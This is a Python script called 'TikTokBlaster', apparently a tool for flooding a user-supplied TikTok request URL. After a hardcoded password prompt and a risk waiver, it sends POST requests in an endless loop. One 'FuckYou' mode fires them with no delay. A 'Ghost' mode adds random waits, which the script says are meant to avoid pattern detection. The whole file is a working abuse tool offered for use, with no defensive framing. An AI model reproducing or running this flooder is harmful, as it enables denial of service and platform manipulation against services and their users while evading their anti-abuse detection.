import requests
from requests.sessions import session
import json
import time
import sys
import itertools
import colorama
from random import randint
from time import sleep
from colorama import Fore, Back, Style

colorama.init()

session = requests.session()

def typewrite(word: str):
    for i in word:
        time.sleep(0.02)
        print(Style.BRIGHT + i, end="", flush = True)

typewrite("WELCOME TO TIKTOKBLASTER V1.2.1(β)")
sleep(0.3)
print("")
typewrite("For instructions: https://github.com/NIFTY-SKIDDIE/TikTokBlaster")

print("")
print("")

while True:
		print("")
		choice2 = input('Enter password to continue: ')
		if choice2 =='123001100321':
			print(Style.BRIGHT + Fore.GREEN + 'Password accepted.' + Fore.RESET)
			break


		else:
			print(Style.BRIGHT + Fore.RED + 'Wrong password. shutting down...' + Fore.RESET)
			sleep(1.5)
			sys.exit()

while True:
		choice = input('Enter [1] if you agree to use this program at your own risk or [2] to disagree: ')
		if choice =='2':
			print(Fore.RED +'You must agree to use this program at your own risk. shutting down now...')
			sleep(4)
			sys.exit()
		elif choice=='1':
			print(Fore.GREEN +'You agreed to use this program at your own risk.' + Fore.RESET)
			break

while True:
		choice2 = input('Enter [1] for "FuckYou!" mode, or [2] for "Ghost" mode: ')
		if choice2 =='1':
			print(Fore.YELLOW + 'FuckYou mode selected. initializing...' + Fore.RESET)
			sleep(1)
			x = input('Enter the HTTP request URL:')
			print("")
			print("")
			print(Style.BRIGHT + Fore.YELLOW + "Let's get that fucker... initializing requests!"+ Fore.RESET)
			print('')
			print('')
			sleep(1)
			counter = 0
			while True:
				counter +=1
				print('***BOOM, BLASTED!***')
				req = session.post(x)
				print(req.text)
				print(Fore.YELLOW + 'request #:'+ Fore.RESET)
				print(counter)


		elif choice2=='2':
			print(Fore.YELLOW + 'Ghost mode selected. initializing...' + Fore.RESET)
			sleep(1)
			break

			

x = input('Enter the HTTP request URL: ')
print("")
print("")

print(Style.BRIGHT + Fore.YELLOW + "Let's get that fucker... initiating requests!"+ Fore.RESET)

print('')
print('') 

counter = 0
while True:
	counter += 1

	req = session.post(x)
	print('***BOOM, BLASTED!***')
	print(req.text)
	print(Fore.YELLOW + 'Request #:'+ Fore.RESET)
	print(counter)
	print(Fore.YELLOW + 'Generating a random wait interval to avoid pattern detection...' + Fore.RESET)
	sleep(randint(1,5))


input()
